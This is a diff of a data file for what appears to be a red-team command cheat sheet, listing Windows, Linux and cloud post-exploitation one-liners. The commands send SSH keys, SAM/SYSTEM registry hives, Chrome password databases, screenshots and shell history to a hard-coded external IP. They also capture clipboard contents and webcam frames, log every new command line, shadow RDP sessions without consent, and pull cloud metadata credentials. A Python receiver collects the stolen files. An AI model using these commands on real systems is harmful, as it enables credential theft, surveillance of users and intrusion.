     title: "Watch PS History Live",
-    code: "while($true){ Get-Content C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt -Tail 10; Start-Sleep 10 }",
+    desc: "Continuously monitor target user's PS history. Replace victim with username.",
+    code: "while($true){ Get-Content C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -Tail 10; Start-Sleep 10 }",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "CMD History",
+    desc: "Show command history for current CMD session only.",
     code: "doskey /history",
     tags: ["cmd", "postexploit", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Enable Cmd Line Auditing",
-    code: "reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f",
+    desc: "Enable command line auditing in Security log (Event 4688).",
+    code: "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f",
     tags: ["cmd", "postexploit", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Read Security Log (Process)",
+    desc: "Read process creation events with command lines from Security log.",
     code: "Get-WinEvent -LogName Security -MaxEvents 500 | Where-Object {$_.Id -eq 4688} | Select-Object TimeCreated, @{n='Cmd';e={$_.Properties[8].Value}}",
     tags: ["ps", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Clipboard Capture Loop",
-    code: "while($true){ Get-Clipboard | Out-File C:\\\\Windows\\\\Temp\\\\clip.log -Append; Start-Sleep 5 }",
+    desc: "Continuously capture clipboard contents to a log file.",
+    code: "while($true){ Get-Clipboard | Out-File C:\\Windows\\Temp\\clip.log -Append; Start-Sleep 5 }",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Read Clipboard Log",
-    code: "Get-Content C:\\\\Windows\\\\Temp\\\\clip.log",
+    desc: "Read captured clipboard contents.",
+    code: "Get-Content C:\\Windows\\Temp\\clip.log",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Screenshot Capture",
-    code: "Add-Type -AssemblyName System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); $b.Save('C:\\\\Windows\\\\Temp\\\\ss.png')",
+    desc: "Take a screenshot and save to Temp folder.",
+    code: "Add-Type -AssemblyName System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); $b.Save('C:\\Windows\\Temp\\ss.png')",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "List Open Windows",
+    desc: "List all visible application windows with titles.",
     code: "Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object ProcessName, MainWindowTitle",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Webcam Capture (ffmpeg)",
-    code: "ffmpeg -f dshow -i video='Integrated Camera' -frames:v 1 C:\\\\Windows\\\\Temp\\\\cam.jpg",
+    desc: "Capture single frame from webcam. Requires ffmpeg installed.",
+    code: "ffmpeg -f dshow -i video='Integrated Camera' -frames:v 1 C:\\Windows\\Temp\\cam.jpg",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "List Audio/Video Devices",
+    desc: "Enumerate camera and audio devices on the system.",
     code: "Get-PnpDevice -Class Camera,AudioEndpoint | Select-Object FriendlyName, Status",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Browser History Chrome",
-    code: "copy $env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\'User Data'\\\\Default\\\\History C:\\\\Windows\\\\Temp\\\\chrome_hist.db",
+    desc: "Copy Chrome browser history database for offline analysis.",
+    code: "copy \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History\" C:\\Windows\\Temp\\chrome_hist.db",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Browser History Edge",
-    code: "copy $env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\'User Data'\\\\Default\\\\History C:\\\\Windows\\\\Temp\\\\edge_hist.db",
+    desc: "Copy Edge browser history database for offline analysis.",
+    code: "copy \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History\" C:\\Windows\\Temp\\edge_hist.db",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Exfil File to VPS",
-    code: "$b=[IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\ss.png'); IWR -Uri 'http://VPS:8080/upload' -Method POST -Body $b",
+    desc: "Upload a file to VPS receiver. Change path and port as needed.",
+    code: "$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\ss.png'); IWR -Uri 'http://168.144.166.97:8083/upload' -Method POST -Body $b",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Record Typed Commands (WMI)",
-    code: "Register-WmiEvent -Query \"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'\" -Action { $Event.SourceEventArgs.NewEvent.TargetInstance.CommandLine | Out-File C:\\\\Windows\\\\Temp\\\\cmds.log -Append }",
+    desc: "WMI event subscription to log all new process command lines.",
+    code: "Register-WmiEvent -Query \"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'\" -Action { $Event.SourceEventArgs.NewEvent.TargetInstance.CommandLine | Out-File C:\\Windows\\Temp\\cmds.log -Append }",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Read Command Log",
-    code: "Get-Content C:\\\\Windows\\\\Temp\\\\cmds.log -Tail 50",
+    desc: "Read last 50 lines of captured command log.",
+    code: "Get-Content C:\\Windows\\Temp\\cmds.log -Tail 50",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Watch NEW Commands Only",
-    code: "$last=0; while($true){ $h=Get-Content C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt; $new=$h.Count; if($new -gt $last){ Write-Host '=== NEW ===' -Fore Green; $h[$last..($new-1)]; $last=$new }; Start-Sleep 5 }",
+    desc: "Monitor for new PS commands in real-time. Replace victim with username.",
+    code: "$last=0; while($true){ $h=Get-Content C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt; $new=$h.Count; if($new -gt $last){ Write-Host '=== NEW ===' -Fore Green; $h[$last..($new-1)]; $last=$new }; Start-Sleep 5 }",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Watch All Users History",
-    code: "while($true){ Clear-Host; Get-ChildItem C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\*.txt | ForEach-Object { $u=$_.FullName.Split('\\\\')[2]; Write-Host \"=== $u ===\" -Fore Cyan; Get-Content $_ -Tail 5 }; Start-Sleep 10 }",
+    desc: "Monitor PS history from all users simultaneously.",
+    code: "while($true){ Clear-Host; Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*.txt | ForEach-Object { $u=$_.FullName.Split('\\')[2]; Write-Host \"=== $u ===\" -Fore Cyan; Get-Content $_ -Tail 5 }; Start-Sleep 10 }",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Check Current Session ID",
+    desc: "Show which session you are currently in (marked with >).",
     code: "qwinsta | findstr '>'",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Session 0 (Services Session)",
+    desc: "Explanation of Session 0 - services run here, no desktop.",
     code: "echo 'Session 0 = services/non-interactive. Beacons run here. No desktop = no GUI apps visible. RDP starts at ID 2+'",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Shadow Requires RDP Session",
+    desc: "Reminder that RDP shadow only works on desktop sessions.",
     code: "echo 'Shadow needs desktop. RDP as attacker then run: mstsc /shadow:ID /noConsentPrompt /control'",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "List Users with Sessions",
+    desc: "List logged-in users and their session states.",
     code: "query user",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Get Session Details",
+    desc: "Get detailed info about all sessions including state.",
     code: "qwinsta /server:localhost",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Logoff User Session",
+    desc: "Force logoff a user session. Get SESSION_ID from qwinsta.",
     code: "logoff SESSION_ID",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Send Message to Session",
+    desc: "Send a popup message to a user session.",
     code: "msg SESSION_ID 'Your message here'",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Disconnect User (Keep Session)",
+    desc: "Disconnect user but keep their session alive (apps stay running).",
     code: "tsdiscon SESSION_ID",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Exfil SSH Keys to VPS",
-    code: "$k = Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -EA SilentlyContinue | Get-Content -Raw; IWR -Uri 'http://168.144.166.97:8080/keys' -Method POST -Body $k",
+    desc: "Send all SSH keys from all users to VPS receiver.",
+    code: "$k = Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | Get-Content -Raw; IWR -Uri 'http://168.144.166.97:8083/keys' -Method POST -Body $k",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Exfil SSH Keys with Paths",
-    code: "Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -EA SilentlyContinue | ForEach-Object { \"=== $($_.FullName) ===`n$(Get-Content $_ -Raw)\" } | Out-String | % { IWR -Uri 'http://168.144.166.97:8080/keys' -Method POST -Body $_ }",
+    desc: "Send SSH keys with file paths preserved for context.",
+    code: "Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | ForEach-Object { \"=== $($_.FullName) ===`n$(Get-Content $_ -Raw)\" } | Out-String | % { IWR -Uri 'http://168.144.166.97:8083/keys' -Method POST -Body $_ }",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Check VPS Receiver Running",
-    code: "ss -tlnp | grep 8080",
+    desc: "Verify HTTP receiver is listening on VPS.",
+    code: "ss -tlnp | grep 8083",
     tags: ["linux", "c2", "recon"],
     accent: "#00ff41"
   },
   {
     title: "View Received Reports",
+    desc: "List and read received exfil files on VPS.",
     code: "ls -la /opt/reports/ && cat /opt/reports/*.txt",
     tags: ["linux", "c2"],
     accent: "#00ff41"
   },
   {
     title: "Start Simple NC Receiver",
-    code: "nc -lvnp 8080 | tee received.txt",
+    desc: "Quick netcat receiver that saves to file.",
+    code: "nc -lvnp 8083 | tee received.txt",
     tags: ["linux", "c2"],
     accent: "#00ff41"
   },
   {
     title: "Exfil File Base64 (Any File)",
-    code: "$f='C:\\\\path\\\\to\\\\file'; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($f)); IWR -Uri 'http://168.144.166.97:8080/exfil' -Method POST -Body $b",
+    desc: "Base64 encode and exfil any file. Change path variable.",
+    code: "$f='C:\\path\\to\\file'; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($f)); IWR -Uri 'http://168.144.166.97:8083/exfil' -Method POST -Body $b",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Exfil SAM/SYSTEM Hashes",
-    code: "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\s1; reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\s2; $d=(Get-Content C:\\\\Windows\\\\Temp\\\\s1,C:\\\\Windows\\\\Temp\\\\s2 -Raw -Encoding Byte); IWR -Uri 'http://168.144.166.97:8080/hashes' -Method POST -Body $d",
+    desc: "Dump SAM and SYSTEM hives for offline hash extraction.",
+    code: "reg save HKLM\\SAM C:\\Windows\\Temp\\s1; reg save HKLM\\SYSTEM C:\\Windows\\Temp\\s2; $d=(Get-Content C:\\Windows\\Temp\\s1,C:\\Windows\\Temp\\s2 -Raw -Encoding Byte); IWR -Uri 'http://168.144.166.97:8083/hashes' -Method POST -Body $d",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Exfil Chrome Passwords DB",
-    code: "copy \"$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" C:\\\\Windows\\\\Temp\\\\c.db; $b=[IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\c.db'); IWR -Uri 'http://168.144.166.97:8080/chrome' -Method POST -Body $b",
+    desc: "Copy and exfil Chrome password database.",
+    code: "copy \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\Windows\\Temp\\c.db; $b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\c.db'); IWR -Uri 'http://168.144.166.97:8083/chrome' -Method POST -Body $b",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Decode Base64 on VPS",
+    desc: "Decode base64 encoded exfil data.",
     code: "cat received.txt | base64 -d > decoded_file",
     tags: ["linux", "c2"],
     accent: "#00ff41"
   },
   {
     title: "Exfil via Certutil (Alt)",
-    code: "certutil -encode C:\\\\secret.txt C:\\\\Windows\\\\Temp\\\\enc.txt && type C:\\\\Windows\\\\Temp\\\\enc.txt | curl -X POST -d @- http://168.144.166.97:8080/data",
+    desc: "Base64 encode with certutil and exfil via curl.",
+    code: "certutil -encode C:\\secret.txt C:\\Windows\\Temp\\enc.txt && type C:\\Windows\\Temp\\enc.txt | curl -X POST -d @- http://168.144.166.97:8083/data",
     tags: ["cmd", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Simple HTTP Receiver (VPS)",
-    code: "cat > /opt/catch_all.py << 'EOF'\\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\\nfrom datetime import datetime\\nimport os\\n\\nclass Handler(BaseHTTPRequestHandler):\\n    def do_POST(self):\\n        length = int(self.headers.get('Content-Length', 0))\\n        body = self.rfile.read(length)\\n        ts = datetime.now().strftime('%Y%m%d_%H%M%S')\\n        path = self.path.replace('/', '_')\\n        filename = f'/keys/{ts}{path}.txt'\\n        with open(filename, 'wb') as f:\\n            f.write(body)\\n        print(f'[+] Saved {len(body)} bytes to {filename}')\\n        self.send_response(200)\\n        self.end_headers()\\n        self.wfile.write(b'OK')\\n\\nos.makedirs('/keys', exist_ok=True)\\nprint('[*] Listening on 0.0.0.0:8083')\\nHTTPServer(('0.0.0.0', 8083), Handler).serve_forever()\\nEOF\\npython3 /opt/catch_all.py",
+    desc: "Python HTTP receiver that saves all POSTs to /keys/. Run on VPS.",
+    code: "cat > /opt/catch_all.py << 'EOF'\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom datetime import datetime\nimport os\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        length = int(self.headers.get('Content-Length', 0))\n        body = self.rfile.read(length)\n        ts = datetime.now().strftime('%Y%m%d_%H%M%S')\n        path = self.path.replace('/', '_')\n        filename = f'/keys/{ts}{path}.txt'\n        with open(filename, 'wb') as f:\n            f.write(body)\n        print(f'[+] Saved {len(body)} bytes to {filename}')\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\nos.makedirs('/keys', exist_ok=True)\nprint('[*] Listening on 0.0.0.0:8083')\nHTTPServer(('0.0.0.0', 8083), Handler).serve_forever()\nEOF\npython3 /opt/catch_all.py",
     tags: ["linux", "c2"],
     accent: "#00ff41"
   },
   {
     title: "Exfil SSH Key (Working)",
-    code: "Invoke-RestMethod -Uri 'http://168.144.166.97:8083/key' -Method POST -Body (Get-Content C:\\\\Users\\\\victim\\\\.ssh\\\\id_ed25519 -Raw)",
+    desc: "Exfil single SSH key via Invoke-RestMethod. Replace victim.",
+    code: "Invoke-RestMethod -Uri 'http://168.144.166.97:8083/key' -Method POST -Body (Get-Content C:\\Users\\victim\\.ssh\\id_ed25519 -Raw)",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Exfil All SSH Keys (Working)",
-    code: "(Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -EA SilentlyContinue | ForEach-Object { \"=== $_ ===`n\" + (Get-Content $_ -Raw) }) -join \"`n\" | % { Invoke-RestMethod -Uri 'http://168.144.166.97:8083/sshkeys' -Method POST -Body $_ }",
+    desc: "Exfil all SSH keys from all users with file paths.",
+    code: "(Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | ForEach-Object { \"=== $_ ===`n\" + (Get-Content $_ -Raw) }) -join \"`n\" | % { Invoke-RestMethod -Uri 'http://168.144.166.97:8083/sshkeys' -Method POST -Body $_ }",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Exfil via Curl (Alt)",
-    code: "type C:\\\\Users\\\\victim\\\\.ssh\\\\id_ed25519 | curl.exe -X POST -d @- http://168.144.166.97:8083/key",
+    desc: "Exfil SSH key using curl.exe. Replace victim.",
+    code: "type C:\\Users\\victim\\.ssh\\id_ed25519 | curl.exe -X POST -d @- http://168.144.166.97:8083/key",
     tags: ["cmd", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Exfil PS History",
-    code: "Invoke-RestMethod -Uri 'http://168.144.166.97:8083/history' -Method POST -Body (Get-Content $env:APPDATA\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt -Raw)",
+    desc: "Exfil your own PowerShell command history.",
+    code: "Invoke-RestMethod -Uri 'http://168.144.166.97:8083/history' -Method POST -Body (Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -Raw)",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Exfil with UseBasicParsing",
+    desc: "IWR with UseBasicParsing for systems without IE.",
     code: "IWR -Uri 'http://168.144.166.97:8083/data' -Method POST -Body $data -UseBasicParsing",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Kill Old Receiver",
+    desc: "Kill old Python receivers on VPS.",
     code: "pkill -f simple_receiver; pkill -f catch_all",
     tags: ["linux", "c2"],
     accent: "#00ff41"
   },
   {
     title: "Watch Incoming Files",
+    desc: "Monitor /keys/ directory for new exfil files.",
     code: "watch -n 1 'ls -la /keys/'",
     tags: ["linux", "c2"],
     accent: "#00ff41"
   },
   {
     title: "[CLOUD] Find Idle/Shutdown Services",
+    desc: "Find cloud lab idle detection services that may shut down the VM.",
     code: "Get-Service | Where-Object {$_.DisplayName -match 'shutdown|idle|timeout|checker'} | Select-Object Name, DisplayName, Status, StartType",
     tags: ["ps", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Disable Idle Checker",
+    desc: "Disable idle detection services to prevent auto-shutdown.",
     code: "Get-Service | Where-Object {$_.DisplayName -match 'Idle'} | Stop-Service -Force -PassThru | Set-Service -StartupType Disabled",
     tags: ["ps", "cloud", "persist"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Keep-Alive Task (5min)",
+    desc: "Create scheduled task running every 5 minutes to keep cloud VM alive.",
     code: "schtasks /create /tn 'KeepAlive' /tr 'powershell -w hidden -c Get-Date' /sc minute /mo 5 /ru SYSTEM /f",
     tags: ["cmd", "cloud", "persist"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Verify Keep-Alive",
+    desc: "Check if keep-alive scheduled task is configured.",
     code: "schtasks /query /tn 'KeepAlive'",
     tags: ["cmd", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Remove Keep-Alive",
+    desc: "Remove keep-alive task when done with the lab.",
     code: "schtasks /delete /tn 'KeepAlive' /f",
     tags: ["cmd", "cloud"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Mouse Jiggle Anti-Idle",
+    desc: "Jiggle mouse cursor every 5 minutes to prevent idle detection.",
     code: "Add-Type -AssemblyName System.Windows.Forms; while($true){$p=[System.Windows.Forms.Cursor]::Position;[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($p.X+1),$p.Y);Start-Sleep -ms 100;[System.Windows.Forms.Cursor]::Position=$p;Start-Sleep -s 300}",
     tags: ["ps", "cloud", "persist"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] RDP List Sessions",
+    desc: "List all RDP and console sessions on cloud VM.",
     code: "qwinsta",
     tags: ["cmd", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] RDP Shadow (View Only)",
+    desc: "Spy on a cloud user session. Get SESSION_ID from qwinsta.",
     code: "mstsc /shadow:SESSION_ID /noConsentPrompt",
     tags: ["cmd", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] RDP Shadow (Full Control)",
+    desc: "Take full control of cloud user session.",
     code: "mstsc /shadow:SESSION_ID /noConsentPrompt /control",
     tags: ["cmd", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Enable Shadow No Consent",
-    code: "reg add 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f",
+    desc: "Enable RDP shadowing without user consent on cloud VM.",
+    code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f",
     tags: ["cmd", "cloud", "persist"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Disable Shadow",
-    code: "reg add 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services' /v Shadow /t REG_DWORD /d 0 /f",
+    desc: "Disable RDP shadowing completely (defensive).",
+    code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 0 /f",
     tags: ["cmd", "cloud", "defender"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Check Shadow Policy",
-    code: "reg query 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services' /v Shadow",
+    desc: "Check current RDP shadow policy setting on cloud VM.",
+    code: "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow",
     tags: ["cmd", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Session 0 = No Desktop",
+    desc: "Reference: Session 0 isolation. Services run in Session 0 (no GUI). RDP/console sessions start at ID 2+. Beacons in Session 0 are invisible.",
     code: "echo 'Session 0 is services session - no GUI. Beacons run here. RDP sessions start at ID 2+'",
     tags: ["cmd", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Check Current Session",
+    desc: "Shows your current RDP/console session. The '>' marks active session. Note session ID for logoff/message commands.",
     code: "qwinsta | findstr '>'",
     tags: ["cmd", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Logoff User Session",
+    desc: "Force logoff a user session. Get SESSION_ID from 'qwinsta'. User loses unsaved work immediately.",
     code: "logoff SESSION_ID",
     tags: ["cmd", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Disconnect User (Keep Alive)",
+    desc: "Disconnects session but keeps processes running. User can reconnect. Stealthier than logoff.",
     code: "tsdiscon SESSION_ID",
     tags: ["cmd", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Send Message to Session",
+    desc: "Sends popup message to specific session. Replace SESSION_ID with number from qwinsta output.",
     code: "msg SESSION_ID 'Your message here'",
     tags: ["cmd", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Azure IMDS Check",
+    desc: "Queries Azure Instance Metadata Service. Returns VM name, region, subscription, resource group. Works only from Azure VMs.",
     code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
     tags: ["ps", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] AWS IMDS Check",
+    desc: "Queries AWS Instance Metadata Service. Returns instance ID, AMI, security groups. Works only from EC2 instances.",
     code: "Invoke-RestMethod -Uri 'http://169.254.169.254/latest/meta-data/'",
     tags: ["ps", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] GCP Metadata Check",
+    desc: "Queries GCP Metadata Service. Requires Metadata-Flavor header. Returns project ID, service accounts.",
     code: "Invoke-RestMethod -Headers @{'Metadata-Flavor'='Google'} -Uri 'http://169.254.169.254/computeMetadata/v1/'",
     tags: ["ps", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] AWS Creds from IMDS",
+    desc: "Lists IAM roles attached to instance. Then query /iam/security-credentials/ROLE_NAME for actual temp credentials.",
     code: "Invoke-RestMethod -Uri 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
     tags: ["ps", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "[CLOUD] Azure Managed Identity Token",
+    desc: "Gets OAuth token for Azure management API. Use token to call Azure REST APIs. Token valid ~1 hour.",
     code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
     tags: ["ps", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "Test VPS Connection",
+    desc: "Tests if C2 port is reachable from target. TcpTestSucceeded = True means connection works.",
     code: "Test-NetConnection 168.144.166.97 -Port 4444",
     tags: ["ps", "recon", "c2"],
     accent: "#00f0ff"
   },
   {
     title: "Test Multiple Ports",
+    desc: "Checks all VPS service ports at once. Shows which ports are reachable from target network.",
     code: "@(4444,8080,8081,8083,9999) | % { Test-NetConnection 168.144.166.97 -Port $_ | Select RemotePort, TcpTestSucceeded }",
     tags: ["ps", "recon", "c2"],
     accent: "#00f0ff"
   },
   {
     title: "Quick Port Check (Faster)",
+    desc: "Faster than Test-NetConnection. Returns OPEN or CLOSED immediately. Good for quick checks.",
     code: "$t = New-Object Net.Sockets.TcpClient; try { $t.Connect('168.144.166.97', 4444); 'OPEN' } catch { 'CLOSED' }; $t.Close()",
     tags: ["ps", "recon", "c2"],
     accent: "#00f0ff"
   },
   {
     title: "Ping VPS",
+    desc: "Basic connectivity test. If this fails, VPS is down or ICMP blocked. 4 pings with response times.",
     code: "ping 168.144.166.97 -n 4",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Traceroute to VPS",
+    desc: "Shows network path to VPS. Useful for diagnosing routing issues or finding firewall hops.",
     code: "tracert 168.144.166.97",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Check HTTP Server",
+    desc: "Tests if HTTP server is responding. StatusCode 200 = working. 5 second timeout.",
     code: "Invoke-WebRequest -Uri 'http://168.144.166.97:8080' -UseBasicParsing -TimeoutSec 5 | Select StatusCode",
     tags: ["ps", "recon", "c2"],
     accent: "#00f0ff"
   },
   {
     title: "Curl Test (Alt)",
+    desc: "Alternative HTTP test using curl.exe. Returns HTTP status code only (200, 404, etc).",
     code: "curl.exe -s -o /dev/null -w '%{http_code}' http://168.144.166.97:8080",
     tags: ["cmd", "recon", "c2"],
     accent: "#00f0ff"
   },
   {
     title: "DNS Lookup",
+    desc: "Reverse DNS lookup on VPS IP. Shows hostname if PTR record exists.",
     code: "nslookup 168.144.166.97",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Check Own IP",
+    desc: "Gets target's public IP. Useful to confirm what IP VPS sees for callbacks.",
     code: "(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Check Outbound Ports",
+    desc: "Tests multiple common egress ports. Finds which ports bypass corporate firewall.",
     code: "@(80,443,4444,8080) | % { $r = Test-NetConnection -ComputerName 168.144.166.97 -Port $_; \"$($_): $($r.TcpTestSucceeded)\" }",
     tags: ["ps", "recon", "firewall"],
     accent: "#00f0ff"
   },
   {
     title: "VPS - Check Listening Ports",
+    desc: "Shows all listening TCP ports with process names. Verify C2/HTTP services are running.",
     code: "ss -tlnp",
     tags: ["linux", "vps", "recon"],
     accent: "#00ff41"
   },
   {
     title: "VPS - Check UFW Status",
+    desc: "Shows firewall rules with numbers. Check ports 4444, 8080, 8083, 8889 are allowed.",
     code: "ufw status numbered",
     tags: ["linux", "vps", "firewall"],
     accent: "#00ff41"
   },
   {
     title: "VPS - Allow Port",
